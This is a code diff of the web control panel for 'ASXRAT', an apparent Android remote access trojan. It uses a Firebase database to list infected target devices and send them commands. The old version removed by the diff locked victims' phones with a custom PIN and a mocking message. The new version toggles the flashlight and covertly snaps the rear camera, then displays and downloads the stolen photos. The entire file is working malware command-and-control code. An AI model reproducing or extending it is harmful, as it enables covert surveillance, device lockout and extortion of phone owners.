@@ -1,33 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ASXRAT | ADMIN CONTROL</title>
+    <title>ASXRAT V1 MASTER TERMINAL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; padding: 20px; }
-        .header { text-align: center; border-bottom: 2px solid #ff0000; padding-bottom: 10px; margin-bottom: 20px; }
-        .container { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 15px; }
-        .card { background: #110000; border: 1px solid #ff0000; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px rgba(255,0,0,0.2); }
-        h3 { margin: 0 0 10px 0; font-size: 16px; color: #fff; }
-        
-        .input-group { margin-top: 10px; border-top: 1px solid #300; padding-top: 10px; }
-        input { background: #000; border: 1px solid #500; color: #fff; padding: 8px; width: 90%; margin-bottom: 5px; outline: none; }
-        
-        button { width: 100%; padding: 10px; margin: 4px 0; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        body { background: #000; color: #00f2ff; font-family: 'Courier New', monospace; padding: 20px; }
+        .card { border: 2px solid #00f2ff; padding: 15px; margin-bottom: 20px; background: #0a0000; border-radius: 10px; box-shadow: 0 0 15px #00f2ff; }
+        .btn { width: 100%; padding: 12px; margin: 5px 0; font-weight: bold; cursor: pointer; border: none; text-transform: uppercase; border-radius: 5px; }
         .btn-flash { background: #ffcc00; color: #000; }
-        .btn-lock { background: #ff0000; color: #fff; }
-        .status-on { color: #00ff00; }
+        .btn-snap { background: #00f2ff; color: #000; }
+        .btn-off { background: #333; color: #fff; }
+        img { width: 100%; max-width: 400px; border: 1px solid #00f2ff; margin-top: 10px; border-radius: 5px; }
+        h1 { text-align: center; letter-spacing: 5px; text-shadow: 0 0 10px #00f2ff; color: #fff; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>ASXRAT DASHBOARD</h1>
-        <p>CONTROL-RAT PROJECT | DEV BY ELVOXI CEO</p>
-    </div>
-
-    <div class="container" id="targetList">Loading...</div>
+    <h1>ASXRAT V1 | CONTROL PANEL</h1>
+    <div id="targetList">Scanning Perangkat di Database...</div>
 
     <script>
         const firebaseConfig = {
@@ -35,66 +26,44 @@
             authDomain: "control-rat.firebaseapp.com",
             databaseURL: "https://control-rat-default-rtdb.asia-southeast1.firebasedatabase.app",
             projectId: "control-rat",
+            storageBucket: "control-rat.appspot.com",
+            messagingSenderId: "181283651682",
             appId: "1:181283651682:web:42a169e6daaad00f7e513b"
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // Pantau Target Online
-        db.ref('targets').on('value', (snapshot) => {
+        db.ref('targets').on('value', (s) => {
             const list = document.getElementById('targetList');
             list.innerHTML = "";
-            const targets = snapshot.val();
-            
-            for(let id in targets) {
-                const t = targets[id];
-                const card = document.createElement('div');
-                card.className = 'card';
-                card.innerHTML = `
-                    <h3>📱 ID: ${id}</h3>
-                    <p>Status: <span class="status-on">${t.status}</span></p>
+            s.forEach(child => {
+                const id = child.key;
+                const data = child.val();
+                list.innerHTML += `
+                <div class="card">
+                    <h3 style="color:#ff0000; margin-top:0;">📱 DEVICE: ${data.model}</h3>
+                    <p style="font-size:12px;">TARGET ID: ${id} | TIME: ${data.time || '-'}</p>
                     
-                    <button class="btn-flash" onclick="sendCmd('${id}', 'on')">🔦 FLASH ON</button>
-                    <button class="btn-flash" style="background:#444; color:#fff;" onclick="sendCmd('${id}', 'off')">OFF</button>
+                    <button class="btn btn-flash" onclick="send('${id}','flash','on')">🔦 SENTER ON</button>
+                    <button class="btn btn-off" onclick="send('${id}','flash','off')">SENTER OFF</button>
+                    <button class="btn btn-snap" onclick="send('${id}','snap','')">📸 SNAP CAMERA BELAKANG</button>
                     
-                    <div class="input-group">
-                        <label style="font-size:10px">PESAN LOCK:</label><br>
-                        <input type="text" id="msg_${id}" value="TERKUNCI KAN HP LU WKWK">
-                        
-                        <label style="font-size:10px">PIN CUSTOM:</label><br>
-                        <input type="number" id="pin_${id}" value="7777">
-                        
-                        <button class="btn-lock" onclick="executeLock('${id}')">🔒 KUNCI PERANGKAT</button>
+                    <div id="box_${id}">
+                        ${data.foto ? `
+                            <p style="color:#0f0">FOTO BERHASIL DITARIK:</p>
+                            <img src="${data.foto}">
+                            <br>
+                            <a href="${data.foto}" download="ASX_${data.model}.jpg">
+                                <button class="btn" style="background:#fff; color:#000">📥 SIMPAN KE GALERI</button>
+                            </a>
+                        ` : '<p style="color:#444">Belum ada foto yang diambil.</p>'}
                     </div>
-                `;
-                list.appendChild(card);
-            }
+                </div>`;
+            });
         });
 
-        // Kirim Senter
-        function sendCmd(id, stat) {
-            db.ref('commands/' + id).update({
-                type: "flash",
-                status: stat
-            });
-        }
-
-        // Kirim Lock dengan PIN Custom
-        function executeLock(id) {
-            const pesan = document.getElementById('msg_' + id).value;
-            const pinCustom = document.getElementById('pin_' + id).value;
-
-            if(!pinCustom) return alert("PIN GAK BOLEH KOSONG COK!");
-
-            db.ref('commands/' + id).set({
-                type: "lock",
-                status: "on",
-                message: pesan,
-                pin: pinCustom, // INI YANG LO MAU! PIN DISET DARI DASHBOARD
-                time: Date.now()
-            }).then(() => {
-                alert("COMMAND SENT! PIN: " + pinCustom);
-            });
+        function send(id, type, stat) {
+            db.ref('commands/' + id).set({ type: type, status: stat });
         }
     </script>
 </body>
